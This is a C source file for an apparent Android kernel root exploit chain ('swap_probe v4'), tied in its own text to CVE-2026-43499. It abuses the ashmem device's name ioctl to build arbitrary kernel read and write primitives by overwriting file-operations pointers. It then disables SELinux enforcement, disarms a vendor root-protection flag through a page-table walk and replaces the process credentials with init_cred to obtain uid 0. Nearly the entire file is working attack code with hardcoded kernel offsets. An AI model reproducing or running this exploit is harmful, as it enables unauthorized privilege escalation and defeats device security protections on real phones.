/*
 * swap_probe v4 — collapse-the-swap root chain.
 * See docs/ROOT_PLAN_2026-08-28.md (§ collapse). All syscall-level.
 *
 * Usage: swap_probe <fake_fops_hex> <slide_hex> [gl_pid]
 *
 * Phase 1 (MILLISECONDS — race the ~2 min llseek death clock):
 *   A1 open fd1 through the staged clone table (FMODE_CAN_WRITE via .write JT)
 *   A2 kwrite: repair fake_fops llseek (+0x08 = slid noop_llseek)
 *   A3 kwrite: REAL ashmem_fops .write slot (+0x18) = slid configfs_write JT
 *   A4 kwrite: miscdevice.fops slot = slid &ashmem_fops  (swap collapsed)
 *   A5 open fd2 through the real table (.write JT, CAN_WRITE) — primitive
 *      now permanent, device normal-looking, fake page no longer needed.
 *
 * Phase 2 (leisurely, on fd2):
 *   B  task self-find via user-PMU x28 (works under Enforcing) or
 *      comm scan (init_task walk, runtime tasks offset)
 *   C  park 1 byte (selinux_state+1 = 0) → kernel-IP perf unlocked
 *   D  hook-page harvest → g_boot_state module VA
 *   E  PTE walk (3-level, PA_BITS=48) → P0(g_boot_state)
 *   F  g_boot_state = 1 (rootguard disarmed); unpark
 *   G  cred/real_cred = init_cred → getuid()==0, persist proof
 *   H  restore real table .write = 0 (device pristine; root persists)
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>

#define __ASHMEMIOC 0x77
#define ASHMEM_NAME_LEN 256
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#define KIMAGE 0xffffffc008000000ULL
#define OFF_NOOP_LLSEEK 0x181FE48ULL
#define OFF_CFG_WRITE 0x1830218ULL        /* configfs_write_bin_file .cfi_jt */
#define OFF_CFG_READ 0x182FCF8ULL         /* configfs_read_bin_file .cfi_jt */
#define OFF_ASH_RDITER 0x1822948ULL
#define OFF_ASH_FOPS 0x22BFDC8ULL         /* &ashmem_fops (real table, image) */
#define OFF_MISC_FOPS 0x291A8E8ULL        /* ashmem miscdevice.fops slot */
#define OFF_SELINUX_STATE 0x2A793C8ULL    /* packed bools, enforcing at +1 */
#define OFF_INIT_TASK 0x27CC000ULL
#define OFF_INIT_CRED 0x27E0BE0ULL

#define PGD_P0 0xffffff802a491000ULL      /* swapper_pg_dir physmap alias */
#define P0_BASE 0xffffff8000000000ULL
#define P0_PHYS_OFF 0x80000000ULL
#define PTE_ADDR_MASK 0x0000FFFFFFFFF000ULL

#define TSK_REAL_CRED 0x778
#define TSK_CRED 0x780
#define TSK_COMM 0x790

#define GBOOT_CORE_OFF 0x3000ULL
#define HOOK_LO 0x3acU
#define HOOK_HI 0x4c8U

#define PROBE_COMM "GLRW04"

static uint64_t g_slide;
static uintptr_t g_fake_fops;
static int g_fd = -1;

static uintptr_t slid(uint64_t off) { return (uintptr_t)(KIMAGE + g_slide + off); }
static uintptr_t p0(uint64_t image_off) {
  return (uintptr_t)(P0_BASE + (0xa8000000ULL + image_off - P0_PHYS_OFF));
}
static uintptr_t p0_of_phys(uint64_t phys) {
  return (uintptr_t)(P0_BASE + phys - P0_PHYS_OFF);
}

static void put64(unsigned char *p, size_t off, uint64_t v) { memcpy(p + off, &v, 8); }
static void put32(unsigned char *p, size_t off, uint32_t v) { memcpy(p + off, &v, 4); }

/* Open the ashmem misc device via a shell-openable alias node.
 * /dev/ashmem itself is SELinux-denied for shell (EACCES, ROM policy);
 * ColorOS creates ashmem<uuid> aliases with the same rdev that open fine.
 * GhostLock's find_ashmem_path does the same scan. */
#include <dirent.h>
#include <sys/stat.h>
static int open_ashmem_alias(void) {
  struct stat base;
  if (stat("/dev/ashmem", &base) != 0) return -1;
  DIR *d = opendir("/dev");
  if (!d) return -1;
  int fd = -1;
  struct dirent *de;
  while ((de = readdir(d)) != NULL) {
    if (strncmp(de->d_name, "ashmem", 6) != 0 ||
        strcmp(de->d_name, "ashmem") == 0)
      continue;
    char path[300];
    snprintf(path, sizeof(path), "/dev/%s", de->d_name);
    struct stat st;
    if (stat(path, &st) != 0 || st.st_rdev != base.st_rdev) continue;
    fd = open(path, O_RDWR | O_CLOEXEC);
    if (fd >= 0) {
      printf("  ashmem alias: %s fd=%d
", path, fd);
      break;
    }
  }
  closedir(d);
  return fd;
}

static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < len; i++) name[i] = blob[i] ? blob[i] : 1;
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < pos; i++) name[i] = blob[i] ? blob[i] : 1;
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int set_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) return -1;
  for (size_t i = len; i > 0; i--)
    if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0) return -1;
  return 0;
}

static ssize_t kwrite(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, 88 - 11, target);
  put32(blob, 96 - 11, (uint32_t)len);
  put32(blob, 100 - 11, 0);
  if (set_name_blob(fd, blob, sizeof(blob)) != 0) return -1;
  errno = 0;
  return pwrite(fd, data, len, 0);
}

/* read via .read arm / pread / disarm — arm window is a few ms */
static ssize_t kread(int fd, uintptr_t target, void *data, size_t len) {
  uint64_t cfg_r = slid(OFF_CFG_READ);
  uint64_t zero = 0;
  if (kwrite(fd, p0(OFF_ASH_FOPS) + 0x10, &cfg_r, 8) != 8) return -10;
  if (kwrite(fd, p0(OFF_ASH_FOPS) + 0x20, &zero, 8) != 8) return -11;
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = 0x1000;
  if ((size_t)pos < len) pos = (off_t)len + 0x100;
  put64(blob, 88 - 11, (uint64_t)(target - (uintptr_t)pos));
  put32(blob, 96 - 11, (uint32_t)pos + (uint32_t)len);
  put32(blob, 80 - 11, 0);
  put32(blob, 100 - 11, 0);
  ssize_t rd = -1;
  if (set_name_blob(fd, blob, sizeof(blob)) == 0) {
    errno = 0;
    rd = pread(fd, data, len, pos);
  }
  uint64_t real_rd = slid(OFF_ASH_RDITER);
  kwrite(fd, p0(OFF_ASH_FOPS) + 0x10, &zero, 8);
  kwrite(fd, p0(OFF_ASH_FOPS) + 0x20, &real_rd, 8);
  return rd;
}
static uint64_t kread64(int fd, uintptr_t a) {
  uint64_t v = 0;
  if (kread(fd, a, &v, 8) != 8) return 0;
  return v;
}

/* ---- user-PMU x28 leak (works under Enforcing; 08-29 proven) ---- */
static uintptr_t leak_x28(void) {
  int pmu = 8;
  FILE *f = fopen("/sys/bus/event_source/devices/armv8_pmuv3/type", "r");
  if (f) { if (fscanf(f, "%d", &pmu) != 1) pmu = 8; fclose(f); }
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.size = sizeof(pe);
  pe.type = (uint32_t)pmu;
  pe.config = 0x8;
  pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = 1ULL << 28; /* x28 */
  pe.disabled = 1;
  pe.exclude_kernel = 1; /* user-only allowed under Enforcing */
  pe.exclude_hv = 1;
  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0L, -1, -1, 0);
  if (fd < 0) { printf("  x28 perf open errno=%d\n", errno); return 0; }
  size_t msz = 4096 * 65;
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 2000000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 64;
  uint64_t pos = hdr->data_tail;
  uintptr_t cand[8];
  int votes[8] = {0};
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      /* layout: ip (u64), then regs mask (u64) + x28 (u64) */
      uint64_t ip = *(uint64_t *)((char *)ev + sizeof(*ev));
      uint64_t *regs = (uint64_t *)((char *)ev + sizeof(*ev) + 8);
      uint64_t mask = regs[0];
      uint64_t x28 = regs[1];
      (void)ip;
      if ((mask & (1ULL << 28)) && x28 >= 0xffffff8000000000ULL &&
          x28 <= 0xffffff9000000000ULL) {
        int i, found = -1;
        for (i = 0; i < 8; i++)
          if (votes[i] && cand[i] == x28) { found = i; break; }
        if (found < 0)
          for (i = 0; i < 8; i++)
            if (!votes[i]) { cand[i] = (uintptr_t)x28; found = i; break; }
        if (found >= 0) votes[found]++;
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);
  int best = 0;
  for (int i = 1; i < 8; i++) if (votes[i] > votes[best]) best = i;
  if (votes[best] >= 8) {
    printf("  x28 leak: %016llx (%d votes)\n",
           (unsigned long long)cand[best], votes[best]);
    return cand[best];
  }
  return 0;
}

/* ---- kernel-IP hook harvest (needs park) ---- */
static uintptr_t harvest_gboot(void) {
  int pmu = 8;
  FILE *f = fopen("/sys/bus/event_source/devices/armv8_pmuv3/type", "r");
  if (f) { if (fscanf(f, "%d", &pmu) != 1) pmu = 8; fclose(f); }
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.size = sizeof(pe);
  pe.type = (uint32_t)pmu;
  pe.config = 0x8;
  pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0L, -1, -1, 0);
  printf("  hook perf fd=%d errno=%d\n", fd, errno);
  if (fd < 0) return 0;
  size_t msz = 4096 * 65;
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 3000000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 64;
  uint64_t pos = hdr->data_tail;
  uint64_t pages[24];
  int pc[24], hc[24], np = 0;
  memset(pc, 0, sizeof(pc));
  memset(hc, 0, sizeof(hc));
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      uint64_t ip = *(uint64_t *)((char *)ev + sizeof(*ev));
      if (ip >= 0xffff000000000000ULL) {
        unsigned off = (unsigned)(ip & 0xfffU);
        int found = -1;
        for (int i = 0; i < np; i++)
          if (pages[i] == (ip & ~0xfffULL)) { found = i; break; }
        if (found < 0 && np < 24) {
          pages[np] = ip & ~0xfffULL;
          pc[np] = 0; hc[np] = 0;
          found = np++;
        }
        if (found >= 0) {
          pc[found]++;
          if (off >= HOOK_LO && off < HOOK_HI) hc[found]++;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  int hot = 0;
  for (int i = 0; i < np; i++) {
    printf("  PAGE %016llx n=%d hook=%d\n",
           (unsigned long long)pages[i], pc[i], hc[i]);
    if (pc[i] > pc[hot]) hot = i;
  }
  int best = -1, bh = 0;
  for (int i = 0; i < np; i++) {
    if (i == hot) continue;
    if (hc[i] > bh) { bh = hc[i]; best = i; }
  }
  munmap(buf, msz);
  close(fd);
  if (best >= 0 && bh >= 2) {
    printf("  hook page %016llx -> gboot VA %016llx\n",
           (unsigned long long)pages[best],
           (unsigned long long)(pages[best] + GBOOT_CORE_OFF));
    return (uintptr_t)(pages[best] + GBOOT_CORE_OFF);
  }
  return 0;
}

/* ---- PTE walk ---- */
static uintptr_t walk_to_p0(int fd, uintptr_t va) {
  uint64_t i_pgd = ((uint64_t)va >> 30) & 0x1FF;
  uint64_t i_pmd = ((uint64_t)va >> 21) & 0x1FF;
  uint64_t i_pte = ((uint64_t)va >> 12) & 0x1FF;
  uint64_t e1 = kread64(fd, PGD_P0 + i_pgd * 8);
  printf("  pgd[%llu]=%016llx\n", (unsigned long long)i_pgd,
         (unsigned long long)e1);
  if (!(e1 & 1)) return 0;
  uint64_t e2 = kread64(fd, p0_of_phys(e1 & PTE_ADDR_MASK) + i_pmd * 8);
  printf("  pmd[%llu]=%016llx\n", (unsigned long long)i_pmd,
         (unsigned long long)e2);
  if (!(e2 & 1)) return 0;
  uint64_t phys;
  if (e2 & 2) {
    phys = (e2 & ~0x1FFFFFULL) + (((uint64_t)va) & 0x1FFFFF);
  } else {
    uint64_t e3 = kread64(fd, p0_of_phys(e2 & PTE_ADDR_MASK) + i_pte * 8);
    printf("  pte[%llu]=%016llx\n", (unsigned long long)i_pte,
           (unsigned long long)e3);
    if (!(e3 & 1)) return 0;
    phys = e3 & PTE_ADDR_MASK;
  }
  printf("  phys=%llx P0=%016llx\n", (unsigned long long)phys,
         (unsigned long long)p0_of_phys(phys));
  return p0_of_phys(phys);
}

/* ---- comm-scan task find (fallback when x28 unavailable) ---- */
static int printable_comm(const char *c) {
  int n = 0;
  for (int i = 0; i < 16 && c[i]; i++) {
    if (c[i] < 0x20 || c[i] > 0x7e) return 0;
    n++;
  }
  return n >= 2;
}
static int comm_is_self(const char *c) {
  return strncmp(c, PROBE_COMM, sizeof(PROBE_COMM) - 1) == 0;
}
static int find_self_scan(int fd, uintptr_t *out) {
  uintptr_t init_task = p0(OFF_INIT_TASK);
  char comm[17] = {0};
  if (kread(fd, init_task + TSK_COMM, comm, 16) != 16 ||
      strncmp(comm, "swapper", 7) != 0) {
    printf("  init_task comm bad: %.16s\n", comm);
    return 0;
  }
  for (size_t slot = 0x300; slot < 0x700; slot += 8) {
    uintptr_t nxt = (uintptr_t)kread64(fd, init_task + slot);
    if (nxt < 0xffffff8000000000ULL || nxt > 0xffffff9000000000ULL) continue;
    for (int off = 0x300; off <= 0x700; off += 8) {
      uintptr_t t2 = nxt - (uintptr_t)off;
      char c2[17] = {0};
      if (kread(fd, t2 + TSK_COMM, c2, 16) != 16) continue;
      if (!printable_comm(c2)) continue;
      uintptr_t t = t2;
      for (int hops = 0; hops < 4000; hops++) {
        char c[17] = {0};
        if (kread(fd, t + TSK_COMM, c, 16) != 16) break;
        if (comm_is_self(c)) { *out = t; return 1; }
        t = (uintptr_t)kread64(fd, t + (uintptr_t)off) - (uintptr_t)off;
        if (t < 0xffffff8000000000ULL || t > 0xffffff9000000000ULL) break;
        if (t == init_task) break;
      }
    }
  }
  return 0;
}

int main(int argc, char **argv) {
  if (argc < 3) {
    fprintf(stderr, "usage: %s fake_fops_hex slide_hex [gl_pid]\n", argv[0]);
    return 2;
  }
  g_fake_fops = (uintptr_t)strtoull(argv[1], NULL, 0);
  g_slide = strtoull(argv[2], NULL, 0);
  int gl_pid = (argc > 3) ? (int)strtol(argv[3], NULL, 0) : 0;
  (void)g_fake_fops;

  prctl(PR_SET_NAME, PROBE_COMM, 0, 0, 0);

  /* ============ PHASE 1: collapse the swap (fast!) ============ */
  int fd1 = open_ashmem_alias();
  if (fd1 < 0) { printf("P1 open fd1 errno=%d\n", errno); return 1; }
  uint64_t llseek = slid(OFF_NOOP_LLSEEK);
  uint64_t cfg_w = slid(OFF_CFG_WRITE);
  uint64_t real_fops = (uint64_t)slid(OFF_ASH_FOPS);
  uint64_t zero = 0;
  ssize_t r1 = kwrite(fd1, g_fake_fops + 0x08, &llseek, 8);
  ssize_t r2 = kwrite(fd1, p0(OFF_ASH_FOPS) + 0x18, &cfg_w, 8);
  ssize_t r3 = kwrite(fd1, p0(OFF_MISC_FOPS), &real_fops, 8);
  printf("P1 collapse: llseek=%zd write_jt=%zd misc_restore=%zd\n", r1, r2, r3);
  if (r3 != 8) {
    printf("P1 FAILED — misc.fops not restored; device on death clock\n");
    return 1;
  }
  /* primitive is now the real table's .write slot. GhostLock may die. */
  if (gl_pid) kill(gl_pid, SIGKILL);
  close(fd1);

  int fd2 = open_ashmem_alias();
  if (fd2 < 0) { printf("P1 open fd2 errno=%d\n", errno); return 1; }
  g_fd = fd2;
  uint64_t chk = 0;
  if (kread(fd2, p0(OFF_ASH_FOPS) + 0x18, &chk, 8) == 8)
    printf("P1 verify .write slot = %016llx (want %016llx)\n",
           (unsigned long long)chk, (unsigned long long)cfg_w);
  if (chk != cfg_w) { printf("P1 verify FAILED\n"); return 1; }
  printf("P1 COLLAPSED — primitive permanent, device stable\n");

  /* ============ PHASE 2 ============ */
  /* B: task self-find — x28 first, comm scan fallback */
  uintptr_t task = leak_x28();
  if (task) {
    char c[17] = {0};
    if (kread(fd2, task + TSK_COMM, c, 16) != 16 || !comm_is_self(c)) {
      printf("B x28 comm mismatch (%.16s) — falling back\n", c);
      task = 0;
    }
  }
  if (!task && !find_self_scan(fd2, &task)) {
    printf("B task find FAILED\n");
    kwrite(fd2, p0(OFF_ASH_FOPS) + 0x18, &zero, 8); /* cleanup */
    return 1;
  }
  printf("B task=%016llx\n", (unsigned long long)task);

  /* C: park */
  unsigned char zero_b = 0, one_b = 1;
  printf("C park ret=%zd\n", kwrite(fd2, p0(OFF_SELINUX_STATE) + 1, &zero_b, 1));

  /* D: hook harvest */
  uintptr_t gboot_va = harvest_gboot();
  if (!gboot_va) { printf("D harvest FAILED (unpark+cleanup)\n"); goto cleanup; }

  /* E: PTE walk */
  uintptr_t gboot_p0 = walk_to_p0(fd2, gboot_va);
  if (!gboot_p0) { printf("E walk FAILED (unpark+cleanup)\n"); goto cleanup; }

  /* F: disarm rootguard + unpark */
  printf("F gboot=1 ret=%zd\n", kwrite(fd2, gboot_p0, &one_b, 1));
  printf("F unpark ret=%zd\n", kwrite(fd2, p0(OFF_SELINUX_STATE) + 1, &one_b, 1));

  /* G: cred */
  uint64_t init_cred = (uint64_t)p0(OFF_INIT_CRED);
  printf("G real_cred ret=%zd\n", kwrite(fd2, task + TSK_REAL_CRED, &init_cred, 8));
  printf("G cred ret=%zd\n", kwrite(fd2, task + TSK_CRED, &init_cred, 8));
  if (getuid() == 0) {
    printf("*** ROOT: getuid()=0 ***\n");
    system("id > /data/local/tmp/ROOTED 2>&1");
    system("echo kernel-root-CVE-2026-43499 >> /data/local/tmp/ROOTED");
    system("cat /proc/$$/status | grep -E 'Uid|Gid|Cap' >> /data/local/tmp/ROOTED");
  } else {
    printf("G getuid=%d (guard or cred failed)\n", getuid());
  }

cleanup:
  /* H: pristine device (root cred persists) */
  printf("H restore .write=0 ret=%zd\n",
         kwrite(fd2, p0(OFF_ASH_FOPS) + 0x18, &zero, 8));
  close(fd2);
  printf("PROBE DONE uid=%d\n", getuid());
  return getuid() == 0 ? 0 : 1;
}
